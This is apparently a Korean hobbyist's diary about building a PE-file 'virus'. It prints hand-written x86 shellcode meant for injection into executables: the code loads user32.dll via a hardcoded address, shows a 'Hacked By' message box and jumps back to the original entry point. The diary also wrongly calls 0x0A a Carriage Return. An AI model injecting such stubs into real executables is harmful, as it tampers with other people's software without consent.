2020.10.27 월요일

바이러스를 만들기 전에 프로그램 내에 삽입할 악성코드를 만들 필요가 생겼다.
어셈블리로 직접 짰다.

		push 0x00002121; !!
		push 0x6F6D6761; agmo
		push 0x72502079; y Pr
		push 0x42206465; ed B
		push 0x6B636148; Hack

		mov eax, esp; eax = string addr

		xor edx, edx
		push edx
		push 0x61686168; haha
		mov ebx, esp; ebx = string addr

		push edx
		push ebx
		push eax
		push edx

		call esi
		add esp, 28

2020.10.31 토요일

PE파일을 변형시켜 바이러스가 작동하도록 하는데 성공했다.
이걸 자동화 하기위해 fstream을 이용해 코드를 짜는데
fstream을 통해 0x0A를 삽입하면 앞에 0x0D가 따라오는 버그가 생겼다.

생각을 해보니 0x0A는 Carriage Return이다. fstream에서 0x0A를 개행문자로 받아들이고
자동적으로 Line Feed를 추가해준것이 아닐까?

이게 맞았다.
fstream이 text mode로 열려있었기에 개행문자를 변형시켜주는 편의기능이 작동했던 것이다.
binary mode로 열면 0x0A를 Carriage Return으로 의미부여를 하지 않고 그냥 바이너리로 취급해주기에
해결할 수 있었다.

악성코드가 실행된 후 원래 코드로 넘어가야 하기에 jmp OEP코드를 추가했다.

		push 0x00002121; !!
		push 0x6F6D6761; agmo
		push 0x72502079; y Pr
		push 0x42206465; ed B
		push 0x6B636148; Hack

		mov eax, esp; eax = string addr

		xor edx, edx
		push edx
		push 0x61686168; haha
		mov ebx, esp; ebx = string addr

		push edx
		push ebx
		push eax
		push edx

		call esi
		add esp, 28

		mov eax, 0x12345678
		jmp eax

2020.11.1 일요일 

삽입하고 봤는데 메시지박스가 잘 실행되지 않는다.
바로 user32.dll이 로딩되지 않아서다.

홈메이드 악성코드에 user32.dll을 로딩하는 코드를 추가했다.
		
		push 0x00006C6C
		push 0x642E3233
		push 0x72657375
		push esp
		mov eax, 0x76BE2A40
		call eax
		mov esi, eax
		add esi, 0x000810A0 ; MessageBoxA RVA

		push 0x00002121; !!
		push 0x6F6D6761; agmo
		push 0x72502079; y Pr
		push 0x42206465; ed B
		push 0x6B636148; Hack

		mov eax, esp; eax = string addr

		xor edx, edx
		push edx
		push 0x61686168; haha
		mov ebx, esp; ebx = string addr

		push edx
		push ebx
		push eax
		push edx

		call esi
		add esp, 28

		mov eax, 0x12345678
		jmp eax

이제 정상적으로 실행됨